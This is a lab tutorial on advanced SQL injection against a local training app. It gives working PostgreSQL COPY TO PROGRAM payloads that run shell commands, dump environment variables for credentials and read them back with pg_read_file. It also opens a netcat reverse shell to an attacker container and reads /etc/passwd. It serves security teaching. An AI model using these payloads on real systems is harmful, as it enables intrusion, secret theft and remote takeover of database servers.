# Advanced Techniques

← [Back to Tutorial Index](../README.md#-tutorial-index)

## Overview

This tutorial covers advanced SQL injection exploitation techniques that escalate from database access to full system compromise. You'll learn how PostgreSQL's powerful administrative functions can be abused through SQL injection to execute arbitrary commands and establish remote access to the database server.

**What you'll learn:**
- How to execute shell commands through SQL injection
- Dumping environment variables and server configuration
- Establishing a reverse shell connection
- Privilege escalation from database access to system compromise
- Real-world impact of unpatched SQL injection vulnerabilities

## Getting Started

**Target Application:** These exercises demonstrate the most dangerous capabilities of SQL injection exploitation.

**Before you begin:**
1. Ensure the application is running at [http://localhost:5000](http://localhost:5000)
2. You'll need access to the attacker container for these exercises
3. Navigate to the Search page at [http://localhost:5000/search](http://localhost:5000/search)
4. Login as Alice when prompted

**Warning:** These techniques demonstrate real attack vectors used by malicious actors. Use this knowledge responsibly and only in authorized testing environments.

---

## 1. Dump environment variables to a file

> [!NOTE]
> **Key Concept:** The `COPY TO PROGRAM` command in PostgreSQL allows executing arbitrary shell commands on the database server. By combining this with file operations, attackers can run commands, save their output to files, and then read those files back through SQL injection - achieving command execution.

1. Navigate to the Search page at [http://localhost:5000/search](http://localhost:5000/search)
2. Login as Alice if not already logged in
3. Use PostgreSQL's `COPY TO PROGRAM` command to execute shell commands and dump environment variables to a text file:
   - Enter: `'; COPY (SELECT '') TO PROGRAM 'env > /tmp/env_dump.txt'; SELECT * FROM payments WHERE description ILIKE '%test% --`
4. Read the dumped file using `pg_read_file()`:
   - Enter: `' UNION SELECT 1111,2222,pg_read_file('/tmp/env_dump.txt'),'4444',5555,'6666','7777',CURRENT_TIMESTAMP ORDER BY ID DESC --`
5. Review the environment variables for sensitive information such as:
   - Database credentials
   - API keys
   - System paths
   - Application configuration

**Impact:** This demonstrates how SQL injection can be escalated to execute arbitrary commands and extract sensitive server configuration data.

## 2. Establish a remote shell

> [!NOTE]
> **Key Concept:** The ultimate escalation of SQL injection - using `COPY TO PROGRAM` to execute a reverse shell command. This establishes an interactive shell connection back to the attacker's machine, giving complete control over the database server and demonstrating how a simple input validation flaw can lead to full system compromise.

**Prerequisites:**
- Access to the attacker container
- Netcat (nc) installed
- Knowledge of the attacker's IP address

**Steps:**

1. Open a terminal and access the attacker container:
   ```bash
   docker exec -it typo-attacker /bin/sh
   ```

2. Get the IP address of the attacker container:
   ```bash
   hostname -i
   ```
   - Note this IP address (e.g., `172.20.0.5`) - you'll need it for the reverse shell

3. Start a netcat listener on port 9001:
   ```bash
   nc -lvnp 9001
   ```
   - This listener will wait for the incoming connection from the database server
   - Leave this terminal window open

4. In a new browser window, navigate to the Search page at [http://localhost:5000/search](http://localhost:5000/search)

5. Inject the reverse shell command (replace `172.20.0.5` with your attacker container IP):
   ```
   '; COPY (SELECT '') TO PROGRAM 'nc 172.20.0.5 9001 -e /bin/sh'; SELECT * FROM payments WHERE description ILIKE '%haxxed% --
   ```

6. Check your netcat listener terminal window for the incoming shell connection

7. You now have remote code execution on the database server!

**Test your access:**
- Try running: `whoami` to see what user you're running as
- Try running: `pwd` to see your current directory
- Try running: `ls -la` to list files
- Try running: `cat /etc/passwd` to read system files

**Impact:** This demonstrates the complete attack chain - from a simple input validation vulnerability to full remote code execution and system compromise.

---

## Congratulations!

**You've completed all SQL Injection tutorials!**

You've now learned:
- ✅ Basic SQL injection identification and exploitation
- ✅ UNION-based data extraction techniques
- ✅ Blind SQL injection with boolean logic
- ✅ Automated exploitation with Python
- ✅ Advanced privilege escalation
- ✅ Remote code execution through SQL injection

**What's next?**
- Review the tutorials: [1. Introduction](./1.%20INTRO%20TO%20SQL%20INJECTION.MD) | [2. Blind SQLi](./2.%20BLIND%20SQL%20INJECTION.md)
- Study the application source code to understand how these vulnerabilities occur
- Learn about mitigation strategies: parameterized queries, input validation, least privilege
- Practice on other vulnerable applications to reinforce your skills

← [Back to Tutorial Index](../README.md#-tutorial-index)